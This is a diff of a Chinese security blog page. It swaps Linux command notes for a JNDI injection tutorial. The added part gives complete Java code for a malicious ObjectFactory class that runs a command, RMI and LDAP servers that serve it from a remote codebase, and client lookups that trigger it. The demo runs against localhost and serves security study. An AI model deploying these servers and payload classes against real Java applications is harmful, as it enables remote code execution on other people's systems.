-<tbody><tr>
-<td>​<code>r</code></td>
-<td>读取</td>
-<td>4</td>
-</tr>
-<tr>
-<td>​<code>w</code></td>
-<td>写入</td>
-<td>2</td>
-</tr>
-<tr>
-<td>​<code>x</code></td>
-<td>执行</td>
-<td>1</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>数字</th>
-<th>权限</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>7</td>
-<td>rwx</td>
-</tr>
-<tr>
-<td>6</td>
-<td>rw-</td>
-</tr>
-<tr>
-<td>5</td>
-<td>r-x</td>
-</tr>
-<tr>
-<td>4</td>
-<td>r–</td>
-</tr>
-<tr>
-<td>0</td>
-<td>—</td>
-</tr>
-</tbody></table>
+<p><code>className</code> 指定了引用的对象的全限定类名，告诉 JNDI 要加载哪个类</p>
+<p><code>factory</code>​ 指定了用于构建对象的工厂类，这个类必须实现 <code>javax.naming.spi.ObjectFactory</code></p>
+<p><code>addrs</code> 包含了一组引用地址，这些地址包含了重建对象的各种信息</p>
 </blockquote>
-</li>
-<li><p><code>chown</code>：改变所有者</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">chown [所有者][:组] [文件或目录]</code></pre></li>
-</ol>
 <p>‍</p>
-<h3 id="搜索查找类命令"><a href="#搜索查找类命令" class="headerlink" title="搜索查找类命令"></a>搜索查找类命令</h3><ol>
-<li><p><code>find</code>：查找文件或目录</p>
-<p> find 从指定的目录向下递归遍历其各个子目录，将满足条件的文件显示在终端</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">find [path] [选项]</code></pre>
-
-<table>
-<thead>
-<tr>
-<th>选项</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>​<code>-name</code></td>
-<td>按文件名查找文件</td>
-</tr>
-<tr>
-<td>​<code>-user</code></td>
-<td>查找属于指定用户名的所有文件</td>
-</tr>
-<tr>
-<td>​<code>-size [+-]n[bcwkMG]</code></td>
-<td>按照指定文件大小查找文件<br />例：<br /><code>-size +10M</code> 查找大于 10 M的文件<br /><code>-size -10b</code> 查找小于 10 b 的文件<br /></td>
-</tr>
-</tbody></table>
-</li>
-<li><p><code>grep</code>：过滤查找</p>
-<p> 配合 <code>|</code> 使用</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">cat 1.txt | grep &quot;123&quot;</code></pre></li>
-<li><p><code>which</code>：在 PATH 下查找命令位置</p>
-</li>
-</ol>
-<p>‍</p>
-<h3 id="压缩和解压类命令"><a href="#压缩和解压类命令" class="headerlink" title="压缩和解压类命令"></a>压缩和解压类命令</h3><ol>
-<li><p><code>gzip/gunzip</code>：压缩、解压</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">gzip [文件]			# 压缩文件，压缩后源文件会消失
-gunzip [文件.gz]		# 解压文件，解压后源文件也会消失</code></pre></li>
-<li><p><code>zip/unzip</code>：压缩、解压</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">zip [选项] [压缩后文件名] [文件]
-unzip [选项] [解压文件名]</code></pre>
-
-<table>
-<thead>
-<tr>
-<th>unzip选项</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>​<code>-d [目录]</code></td>
-<td>指定解压后文件的存放目录</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>zip选项</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>​<code>-r</code></td>
-<td>压缩目录</td>
-</tr>
-</tbody></table>
-</li>
-<li><p><code>tar</code> ：打包、解压</p>
- <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">tar [选项] [压缩后文件名] [文件]</code></pre>
-
-<table>
-<thead>
-<tr>
-<th>选项</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>​<code>-c</code></td>
-<td>产生 <code>.tar</code> 打包文件</td>
-</tr>
-<tr>
-<td>​<code>-v</code></td>
-<td>显示详细信息</td>
-</tr>
-<tr>
-<td>​<code>-f</code></td>
-<td>指定文件名</td>
-</tr>
-<tr>
-<td>​<code>-z</code></td>
-<td>用 gzip 对文件进行压缩或者解压</td>
-</tr>
-<tr>
-<td>​<code>-x</code></td>
-<td>解包 <code>.tar</code> 文件</td>
-</tr>
-<tr>
-<td>​<code>-C</code></td>
-<td>解压到指定目录</td>
-</tr>
-</tbody></table>
-</li>
-</ol>
-<p>‍</p>
-<h3 id="Strings-命令"><a href="#Strings-命令" class="headerlink" title="Strings 命令"></a>Strings 命令</h3><p>一个在 misc 中挺常用的命令</p>
-<p>最基本的用法就是指定一个文件，可以指定里面的字符串</p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">strings &lt;文件名&gt;</code></pre>
-
-<p><code>strings</code> 更强大的地方在他的选项</p>
+<h3 id="LDAP-协议"><a href="#LDAP-协议" class="headerlink" title="LDAP 协议"></a>LDAP 协议</h3><p>LDAP 是一种应用层协议，用于访问和维护分布式目录信息服务<br>主要是用来身份验证、信息查询、集中管理用户信息等<br>默认端口是 389</p>
 <ul>
-<li><p>长度控制 <code>-n</code></p>
-<p>用来指定要打印的最小字符串长度，默认情况下，应该是 4 个字符</p>
-<p>只输出长度大于等于 8 的字符串</p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">strings -n 8 &lt;文件名&gt;</code></pre>
-</li>
-<li><p>字符集控制 <code>-e</code></p>
-<p><code>strings</code>​ 默认处理的是 ascii 或 utf-8 的编码，<code>-e</code> 允许指定要搜索的字符编码格式</p>
-<p><code>-e l</code> ：搜索 utf-16 小端序的字符串</p>
-<p><code>-e b</code> ：搜索 utf-16 大端序的字符串</p>
-<p><code>-e S</code> ：搜索单字节字符串 ascii 或 utf-8</p>
-<p><code>-e L</code> ：搜索 32 位小端序的字符串，通常是 utf-32 小端序</p>
-</li>
-<li><p>优化输出 <code>-t</code></p>
-<p>这个选项是输出字符串在文件中的偏移量</p>
-<p><code>-t d</code> ：以十进制打印偏移量</p>
-<p><code>-t o</code> ：以八进制打印偏移量</p>
-<p><code>-t x</code> ：以十六进制打印偏移量</p>
-</li>
+<li>目录服务：LDAP 的目录服务是按照树形结构存储和组织数据，是设计用来快速读取数据的数据库系统，但不适合频繁写入</li>
+<li>条目( Entry )：是目录服务中的核心数据单元，一个条目由三个部分组成：对象类、属性和一个区别名( DN )，区别名是用来定义这个条目在整个目录树中的确切位置</li>
+<li>对象类：对象类是条目的蓝图或者类型，每个条目必须由一个或多个对象类属性，定义了这个条目必须要包含哪些必须属性和可选属性</li>
+<li>属性：属性是 LDAP 目录中信息的最小单元，以键值对的形式存在</li>
+<li>区别名：DN 是条目的唯一标识符，由一系列用逗号分开的属性&#x2F;值对组成，描述了从当前条目到目录根的完整路径<br>每一个属性&#x2F;值对称为一个相对区别名 ( RDN )</li>
 </ul>
 <p>‍</p>
+<h4 id="LDAP-协议操作"><a href="#LDAP-协议操作" class="headerlink" title="LDAP 协议操作"></a>LDAP 协议操作</h4><ol>
+<li>绑定：客户端与 LDAP 服务器建立连接并进行身份验证</li>
+<li>查询：客户端用来查询目录树中符合特定条件的条目</li>
+<li>比较：检查某个条目中的某个属性值是否与给定值匹配</li>
+<li>添加：向目录中添加新的条目</li>
+<li>删除：删除指定的条目</li>
+<li>修改：修改条目的属性值</li>
+<li>修改 DN：修改条目的 DN，从而改变条目在目录树中的位置</li>
+<li>解除绑定：客户端通知 LDAP 服务器结束会话，关闭连接</li>
+</ol>
+<p>‍</p>
+<h3 id="JNDI-结构"><a href="#JNDI-结构" class="headerlink" title="JNDI 结构"></a>JNDI 结构</h3><p><code>javax.naming</code>​：主要用于命名操作，包含命名服务的类和接口，定义了 <code>Context</code>​ 接口和 <code>InitialContext</code> 类</p>
+<p><code>javax.naming.directory</code>​：主要用于目录操作，定义了 <code>DirContext</code>​ 接口和 <code>InitialDirContext</code> 类</p>
+<p><code>javax.naming.event</code>：目录事件通知，让应用监听命名和目录对象的变化</p>
+<p><code>javax.naming.ldap</code>：LDAP 协议专用扩展</p>
+<p><code>javax.naming.spi</code>：SPI 的实现</p>
+<p>‍</p>
+<h2 id="JNDI-注入-1"><a href="#JNDI-注入-1" class="headerlink" title="JNDI 注入"></a>JNDI 注入</h2><p>JNDI 注入的前提是能够操作客户端 lookup 方法或其他远程操作方法的参数</p>
+<h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI + RMI"></a>JNDI + RMI</h3><p>我们需要在 RMI 服务器上绑定一个 <code>Reference</code> 类</p>
+<p><strong>恶意类</strong></p>
+<p><code>EvilClass</code>​ 就是远程类名，同时也还要作为工厂类名，所以这个类要实现 <code>javax.naming.spi.ObjectFactory</code> 接口</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.io.IOException;
+import java.util.Hashtable;
+
+public class EvilClass implements ObjectFactory &#123;
+    static&#123;
+        try&#123;
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        &#125;catch (IOException e)&#123;
+            throw new RuntimeException(e);
+        &#125;
+
+    &#125;
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;
+        return null;
+    &#125;
+&#125;</code></pre>
+
+<p><strong>服务端代码</strong></p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">Reference reference &#x3D; new Reference(&quot;EvilClass&quot;, &quot;EvilClass&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8002&#x2F;&quot;)</code></pre>
+
+<p>攻击的核心 payload ，这里接收的是类名和工厂名，最后的地址是工厂类的网络地址，这个服务器上应该包含 <code>EvilClass</code>​ 字节码的 <code>.class</code> 文件</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(reference);</code></pre>
+
+<p>前面说过，要让 RMI 适配基础类，就需要实现 <code>UnicastRemoteObject</code>​ ，<code>ReferenceWrapper</code>​ 包装后的类就会实现这个，将原本不具备远程能力的 <code>Reference</code> 对象适配成了 RMI 远程对象</p>
+<ul>
+<li>但是 <code>ReferenceWrapper</code> 在后续版本被移除了，需要额外引入 jar 包，这里用的版本是 8u65</li>
+</ul>
+<p>完整代码</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class JndiRmiServer &#123;
+    public static void main(String[] args) throws NamingException, RemoteException &#123;
+        Reference reference &#x3D; new Reference(&quot;EvilClass&quot;, &quot;EvilClass&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8002&#x2F;&quot;);
+        ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(reference);
+        &#x2F;&#x2F; 将 RMI 服务注册到 1099 端口
+        Registry registry &#x3D; LocateRegistry.createRegistry(1099);
+        &#x2F;&#x2F; 绑定 Reference 对象
+        registry.rebind(&quot;EvilClass&quot;, referenceWrapper);
+    &#125;
+&#125;</code></pre>
+
+<p>‍</p>
+<p><strong>客户端</strong></p>
+<p>这里踩了几个坑，因为前面写的不是全限定包名，所以如果不要远程访问的话，就需要将代码放到 java 路径下</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251002171541.png" alt="image"></p>
+<p>如果是要远程访问，就将这些文件移除，并且文件中不能有包名，然后起一个服务</p>
+<pre class="line-numbers language-cmd" data-language="cmd" data-start="1"><code class="language-cmd">python -m http.server 8002</code></pre>
+
+<p>可以看到成功访问了，并且实现了弹出计算机的功能</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251002172105.png" alt="image"></p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import java.rmi.RemoteException;
+
+public class RMIClient &#123;
+    public static void main(String[] args) throws NamingException, RemoteException &#123;
+
+        Context ctx &#x3D; new InitialContext();
+
+        Object lookup &#x3D;  ctx.lookup(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilClass&quot;);
+    &#125;
+&#125;</code></pre>
+
+<p>‍</p>
+<p>‍</p>
+<h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI + LDAP"></a>JNDI + LDAP</h3><p>利用这个也需要 Java 开启一个 LDAP 服务器，需要的依赖如下</p>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;dependency&gt;
+    &lt;groupId&gt;com.unboundid&lt;&#x2F;groupId&gt;
+    &lt;artifactId&gt;unboundid-ldapsdk&lt;&#x2F;artifactId&gt;
+    &lt;version&gt;6.0.7&lt;&#x2F;version&gt;
+&lt;&#x2F;dependency&gt;</code></pre>
+
+<p>LDAP 服务端代码如下</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPException;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.net.UnknownHostException;
+
+public class LdapServer &#123;
+    private static final String LDAP_BASE &#x3D; &quot;dc&#x3D;example,dc&#x3D;com&quot;;
+    public static void main(String[] args) throws LDAPException, UnknownHostException, MalformedURLException &#123;
+        String url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:8002&#x2F;#EvilClass&quot;;
+        int port &#x3D; 8003;
+        InMemoryDirectoryServerConfig config &#x3D; new InMemoryDirectoryServerConfig(LDAP_BASE);
+        config.setListenerConfigs(new InMemoryListenerConfig(
+                &quot;listen&quot;,
+                InetAddress.getByName(&quot;0.0.0.0&quot;),
+                port,
+                ServerSocketFactory.getDefault(),
+                SocketFactory.getDefault(),
+                (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
+        InMemoryDirectoryServer ds &#x3D; new InMemoryDirectoryServer(config);
+        System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);
+        ds.startListening();
+    &#125;
+    public static class OperationInterceptor extends InMemoryOperationInterceptor &#123;
+        private URL codebase;
+        public OperationInterceptor(URL url) &#123;
+            this.codebase &#x3D; url;
+        &#125;
+        @Override
+        public void processSearchResult(InMemoryInterceptedSearchResult result)&#123;
+            String base &#x3D; result.getRequest().getBaseDN();
+            Entry e &#x3D; new  Entry(base);
+            try &#123;
+                sendResult(result,base,e);
+            &#125; catch (MalformedURLException ex) &#123;
+                throw new RuntimeException(ex);
+            &#125; catch (LDAPException ex) &#123;
+                throw new RuntimeException(ex);
+            &#125;
+
+        &#125;
+
+        private void sendResult(InMemoryInterceptedSearchResult result,String base,Entry e) throws MalformedURLException, LDAPException &#123;
+            URL turl &#x3D; new URL(this.codebase,this.codebase.getRef().replace(&#39;.&#39;,&#39;&#x2F;&#39;).concat(&quot;.class&quot;));
+            System.out.println(&quot;Send LDAP reference result for &quot;+ base + &quot;redirecting to&quot; + turl);
+            String cbstr &#x3D; this.codebase.toString();
+            int refPos &#x3D; cbstr.indexOf(&#39;#&#39;);
+            if(refPos &gt; 0)&#123;
+                cbstr &#x3D; cbstr.substring(0, refPos);
+            &#125;
+            e.addAttribute(&quot;javaClassName&quot;,&quot;Exploit&quot;);
+            e.addAttribute(&quot;javaCodeBase&quot;,cbstr);
+            e.addAttribute(&quot;objectClass&quot;,&quot;javaNamingReference&quot;);
+            e.addAttribute(&quot;javaFactory&quot;,this.codebase.getRef());
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        &#125;
+    &#125;
+&#125;</code></pre>
+
+<p>客户端代码</p>
+<pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import javax.naming.InitialContext;
+import javax.naming.NamingException;
+
+public class LdapClient &#123;
+    public static void main(String[] args) throws NamingException &#123;
+        InitialContext context &#x3D; new InitialContext();
+        context.lookup(&quot;ldap:&#x2F;&#x2F;127.0.0.1:8003&#x2F;EvilClass&quot;);
+    &#125;
+&#125;</code></pre>
+
+<p>‍</p>
+<p>‍</p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://changeyourway.github.io/2024/09/06/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-JNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/#LDAP-%E5%8D%8F%E8%AE%AE">漏洞篇 - JNDI 注入详解 - 妙尽璇机</a></p>
 
                 
             </div>
@@ -1013,7 +719,7 @@ unzip [选项] [解压文件名]</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://wwwmarin.xyz/2025/11/28/linux/">https://wwwmarin.xyz/2025/11/28/linux/</a>
+                    <a href="https://wwwmarin.xyz/2025/09/05/jndi-zhu-ru/">https://wwwmarin.xyz/2025/09/05/jndi-zhu-ru/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1051,12 +757,12 @@ unzip [选项] [解压文件名]</code></pre>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/linux/">
-                                    <span class="chip bg-color">linux</span>
+                                <a href="/tags/web/">
+                                    <span class="chip bg-color">web</span>
                                 </a>
                             
-                                <a href="/tags/%E5%9F%BA%E7%A1%80/">
-                                    <span class="chip bg-color">基础</span>
+                                <a href="/tags/java/">
+                                    <span class="chip bg-color">java</span>
                                 </a>
                             
                         </div>
@@ -1139,12 +845,12 @@ unzip [选项] [解压文件名]</code></pre>
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2025/11/28/2025-ciscn/">
+                <a href="/2025/10/01/snakeyaml-fan-xu-lie-hua/">
                     <div class="card-image">
                         
-                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/95662111_p0.jpg" class="responsive-img" alt="2025 ciscn 威胁检测与网络流量分析">
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/3635372_95770536_p0.png" class="responsive-img" alt="SnakeYAML 反序列化">
                         
-                        <span class="card-title">2025 ciscn 威胁检测与网络流量分析</span>
+                        <span class="card-title">SnakeYAML 反序列化</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1155,60 +861,8 @@ unzip [选项] [解压文件名]</code></pre>
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-11-28
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-10-01
                         </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                    比赛复现
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/misc/">
-                        <span class="chip bg-color">misc</span>
-                    </a>
-                    
-                    <a href="/tags/wp/">
-                        <span class="chip bg-color">wp</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2025/11/28/ssti/">
-                    <div class="card-image">
-                        
-                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/15212263_95842155_p0.jpg" class="responsive-img" alt="SSTI">
-                        
-                        <span class="card-title">SSTI</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-11-28
-                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1228,8 +882,60 @@ unzip [选项] [解压文件名]</code></pre>
                         <span class="chip bg-color">web</span>
                     </a>
                     
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">漏洞</span>
+                    <a href="/tags/java/">
+                        <span class="chip bg-color">java</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/07/31/linux/">
+                    <div class="card-image">
+                        
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/A49509B4D767F4369527F90DE4678504.jpg" class="responsive-img" alt="linux 基础">
+                        
+                        <span class="card-title">linux 基础</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-07-31
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/linux/" class="post-category">
+                                    linux
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/linux/">
+                        <span class="chip bg-color">linux</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%9F%BA%E7%A1%80/">
+                        <span class="chip bg-color">基础</span>
                     </a>
                     
                 </div>
